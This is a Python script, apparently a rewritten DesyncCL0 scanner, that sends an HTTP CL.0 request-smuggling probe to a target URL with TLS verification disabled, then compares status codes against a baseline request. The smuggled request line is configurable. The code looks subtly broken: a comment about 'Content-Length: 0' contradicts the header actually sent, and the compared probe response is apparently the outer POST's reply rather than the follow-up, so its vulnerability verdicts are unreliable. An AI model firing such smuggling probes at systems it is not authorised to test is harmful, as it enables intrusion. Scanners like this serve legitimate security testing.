#!/usr/bin/env python3

##
## OG__ https://github.com/riramar/DesyncCL0
##

import sys
import base64
import argparse
import socket
import ssl
from urllib.parse import urlparse, ParseResult
from http.client import HTTPResponse
from io import BytesIO

__version__ = "0.0.3"

BANNER_B64 = (
    "ICAgIF9fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX19fX19fICAgIF9fX"
    "18gCiAgIC8gX18gXF9fXyAgX19fX19fXyAgX19fX19fICBfX19fXy8gX19fXy8gLyAgL"
    "S8gX18gXAogIC8gLyAvIC8gXyBcLyBfX18vIC8gLyAvIF9fIFwvIF9fXy8gLyAgIC8gL"
    "yAgIC8gLyAvIC8KIC8gL18vIC8gIF9fKF9fICApIC9fLyAvIC8gLyAvIC9fXy8gL19fX"
    "y8gL19fXy8gL18vIC8gCi9fX19fXy9cX19fL19fX18vXF9fLCAvXy8gL18vXF9fXy9cX"
    "19fXy9fX19fXy9cX19fXy8gIAogICAgICAgICAgICAgICAgL19fX18vICAgICAgICAgIC"
    "AgICAgICAgICAgICAgICAgICAgICA="
)

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/104.0.0.0 Safari/537.36"
)
DEFAULT_SMUGGLED_LINE = "GET /hopefully404 HTTP/1.1"
DEFAULT_TIMEOUT = 5
RECV_BUFFER = 4096


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


class FakeSocket:
    """Wraps raw bytes so HTTPResponse can parse them."""

    def __init__(self, data: bytes):
        self._file = BytesIO(data)

    def makefile(self, *args, **kwargs):
        return self._file


def print_banner() -> None:
    print(base64.b64decode(BANNER_B64).decode("utf-8"))
    print(f"Version {__version__}\n")


def check_url(url: str) -> ParseResult:
    """Validate and return a parsed URL; raise ArgumentTypeError on failure."""
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise argparse.ArgumentTypeError(
            f"Invalid URL: {url!r}. Example: https://www.example.com/path"
        )
    return parsed


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="DesyncCL0",
        description="Detects HTTP desync CL.0 vulnerabilities.",
    )
    parser.add_argument("URL", type=check_url, help="Target URL to test.")
    parser.add_argument(
        "-s",
        "--smuggledrequestline",
        default=DEFAULT_SMUGGLED_LINE,
        metavar="LINE",
        help=f'Smuggled request line (default: "{DEFAULT_SMUGGLED_LINE}").',
    )
    parser.add_argument(
        "-t",
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        metavar="SEC",
        help=f"Connection timeout in seconds (default: {DEFAULT_TIMEOUT}).",
    )
    parser.add_argument(
        "-u",
        "--user-agent",
        dest="user_agent",
        default=DEFAULT_USER_AGENT,
        metavar="UA",
        help="User-Agent header value.",
    )
    parser.add_argument(
        "-d",
        "--debug",
        action="store_true",
        default=False,
        help="Print raw request/response debug data.",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Networking
# ---------------------------------------------------------------------------


def connect(url: ParseResult, timeout: int) -> socket.socket:
    """Open a (TLS-wrapped) TCP connection to *url*."""
    hostname = url.hostname
    port = url.port or (443 if url.scheme == "https" else 80)

    raw = socket.create_connection((hostname, port), timeout)

    if url.scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=hostname)

    raw.settimeout(timeout)
    return raw


def _is_complete(data: bytes) -> bool:
    """
    Return True when *data* contains a full HTTP response.
    Handles both Content-Length and chunked Transfer-Encoding.
    """
    try:
        resp = HTTPResponse(FakeSocket(data))
        resp.begin()
        cl = resp.getheader("Content-Length")
        if cl is not None:
            return len(resp.read(int(cl))) == int(cl)
        if resp.getheader("Transfer-Encoding"):
            return b"0\r\n\r\n" in data
    except Exception:
        pass
    return False


def send_request(
    sock: socket.socket, raw: bytes, debug: bool = False
) -> tuple[HTTPResponse, bytes]:
    """
    Send *raw* bytes and accumulate the server response.
    Returns (HTTPResponse, raw_bytes).
    """
    sock.sendall(raw)

    data = b""
    while True:
        try:
            chunk = sock.recv(RECV_BUFFER)
        except socket.timeout:
            break
        except socket.error as exc:
            print(f"[ERROR] Socket error after receiving {len(data)} bytes: {exc}")
            if debug and data:
                print(f"[DEBUG] Partial response:\n{data!r}")
            sys.exit(1)

        if not chunk:
            break
        data += chunk
        if _is_complete(data):
            break

    if not data:
        print("[ERROR] Received an empty response from the server.")
        sys.exit(1)

    resp = HTTPResponse(FakeSocket(data))
    resp.begin()

    if debug:
        print(f"[DEBUG] Raw response ({len(data)} bytes):\n{data!r}\n")

    return resp, data


# ---------------------------------------------------------------------------
# Request building
# ---------------------------------------------------------------------------


def build_http_request(
    method: str,
    path: str,
    host: str,
    user_agent: str,
    extra_headers: dict[str, str] | None = None,
) -> bytes:
    """
    Assemble a minimal HTTP/1.1 request and return it as bytes.
    An empty body is appended (\\r\\n terminator after headers).
    """
    lines = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {user_agent}",
        "Connection: close",
    ]
    if extra_headers:
        lines.extend(f"{k}: {v}" for k, v in extra_headers.items())
    lines.append("")  # blank line → end of headers
    lines.append("")  # empty body
    return "\r\n".join(lines).encode()


def build_smuggled_payload(
    smuggled_line: str,
    host: str,
    user_agent: str,
) -> bytes:
    """
    Build the CL.0 desync payload:
      <normal POST with Content-Length: 0>  +  <smuggled request prefix>

    The front-end honours Content-Length and forwards the whole blob;
    the back-end ignores it and treats the trailing bytes as a new request.
    """
    # The "body" that the back-end will interpret as the start of a new request
    smuggled_prefix = f"{smuggled_line}\r\nFoo: x"

    # Outer request – Content-Length: 0 so the front-end stops here
    outer = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"Content-Length: {len(smuggled_prefix.encode())}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{smuggled_prefix}"
    )
    return outer.encode()


# ---------------------------------------------------------------------------
# Vulnerability check
# ---------------------------------------------------------------------------


def cl0_check(
    url: ParseResult,
    smuggled_line: str,
    user_agent: str,
    timeout: int,
    debug: bool,
) -> None:
    """Run the CL.0 desync probe and report results."""
    host = url.netloc
    path = url.path or "/"
    qs = f"?{url.query}" if url.query else ""
    full_path = path + qs

    probe = build_smuggled_payload(smuggled_line, host, user_agent)
    normal = build_http_request("GET", full_path, host, user_agent)

    if debug:
        print(f"[DEBUG] Probe request:\n{probe!r}\n")
        print(f"[DEBUG] Normal request:\n{normal!r}\n")

    # ── Request 1: smuggled payload followed immediately by a normal request ──
    print("[*] Sending smuggled probe + follow-up request...")
    sock = connect(url, timeout)
    try:
        resp_probe, _ = send_request(sock, probe + normal, debug)
    finally:
        sock.close()

    # ── Request 2: clean baseline ─────────────────────────────────────────────
    print("[*] Sending baseline request...")
    sock = connect(url, timeout)
    try:
        resp_baseline, _ = send_request(sock, normal, debug)
    finally:
        sock.close()

    _report(resp_probe, resp_baseline, debug)


def _report(probe: HTTPResponse, baseline: HTTPResponse, debug: bool) -> None:
    """Compare responses and print a verdict."""
    print()
    print(f"  Probe    status : {probe.status}")
    print(f"  Baseline status : {baseline.status}")
    print()

    if probe.status == baseline.status:
        print("[=] Responses match — target does not appear vulnerable.")
    else:
        print("[!] WARNING: Inconsistent responses detected.")
        print("    This may indicate a CL.0 desync vulnerability.")
        print("    Verify manually before drawing conclusions.")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main() -> None:
    if sys.version_info < (3, 9):
        print("Error: Python 3.9 or later is required.")
        sys.exit(1)

    print_banner()
    args = parse_args()

    print(f"[*] Target : {args.URL.geturl()}")
    print("[*] Testing for CL.0 HTTP desync vulnerability...\n")

    cl0_check(
        args.URL,
        args.smuggledrequestline,
        args.user_agent,
        args.timeout,
        args.debug,
    )


if __name__ == "__main__":
    main()
